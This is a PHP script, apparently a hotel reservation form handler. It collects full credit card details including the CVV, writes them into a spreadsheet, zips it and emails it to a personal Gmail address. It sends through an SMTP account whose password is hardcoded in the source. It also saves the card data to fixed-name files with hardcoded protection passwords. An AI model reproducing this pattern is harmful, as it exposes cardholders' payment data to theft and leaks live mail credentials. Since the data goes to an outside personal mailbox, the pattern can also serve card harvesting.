<?php
use PhpOffice\PhpSpreadsheet\Spreadsheet;
use PhpOffice\PhpSpreadsheet\Writer\Xlsx;
use PhpOffice\PhpSpreadsheet\Worksheet\Protection;
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

// Include autoload files
require '../../vendor/autoload.php';

// Check if the form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Extract credit card details from the form
    $cardName = $_POST['card_name'];
    $cardNumber = $_POST['card_number'];
    $expiryMonth = $_POST['card_expiry_month'];
    $expiryYear = $_POST['card_expiry_year'];
    $cvv = $_POST['card_cvv'];

    // Generate Excel file
    $spreadsheet = new Spreadsheet();
    $sheet = $spreadsheet->getActiveSheet();
    $sheet->setCellValue('A1', 'Name On Card');
    $sheet->setCellValue('B1', 'Card Number');
    $sheet->setCellValue('C1', 'Expiration Date');
    $sheet->setCellValue('D1', 'CVV');
    $sheet->setCellValue('A2', $cardName);
    $sheet->setCellValue('B2', $cardNumber);
    $sheet->setCellValue('C2', $expiryMonth . '/' . $expiryYear);
    $sheet->setCellValue('D2', $cvv);

    // Protect the worksheet with a password
    $protection = new Protection();
    $protection->setPassword('strongpassword123'); // Change to a strong password
    $protection->setSheet(true); // Protect the sheet from editing
    $sheet->setProtection($protection);

    $excelFile = 'reservation_details.xlsx';
    $writer = new Xlsx($spreadsheet);
    $writer->save($excelFile);

    // Create a ZIP file with a password
    $zipFile = 'reservation_details.zip';
    $zip = new ZipArchive();
    if ($zip->open($zipFile, ZipArchive::CREATE) === true) {
        // Set the password on the ZIP file
        $zip->setPassword('zipstrongpassword123'); // Change to a strong password
        // Add the Excel file to the ZIP file
        $zip->addFile($excelFile);
        $zip->setEncryptionName($excelFile, ZipArchive::EM_AES_256); // AES-256 encryption
        $zip->close();
    }

    // Create a PHPMailer instance
    $mail = new PHPMailer(true);

    try {
        
        $mail->SMTPDebug = SMTP::DEBUG_OFF; // Set to DEBUG_SERVER for troubleshooting
        $mail->isSMTP();
        $mail->Host       = 'mail.hotelasiacebu.com';
        $mail->SMTPAuth   = true;
        $mail->Username   = 'it@hotelasiacebu.com'; // SMTP username
        $mail->Password   = 'sTxGLCy+ciHH'; // SMTP password
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
        $mail->Port       = 587;

        // Recipients
        $mail->setFrom('it@hotelasiacebu.com', 'Hotel Asia');
        $mail->addAddress('manugasewinjames@gmail.com', 'Hotel Front Office');

        // Content
        $mail->isHTML(true);
        $mail->Subject = 'Reservation Details';
        $mail->Body    = '<p>Please find attached the reservation details.</p>';

        // Attach the ZIP file with the Excel document
        $mail->addAttachment($zipFile, 'reservation_details.zip');

        // Send the email
        $mail->send();
        echo 'Message has been sent';
    } catch (Exception $e) {
        echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
    }

    // Delete the Excel and ZIP files to prevent unauthorized access
    unlink($excelFile);
    unlink($zipFile);
} else {
    echo "Form submission error: Method not allowed.";
}
?>
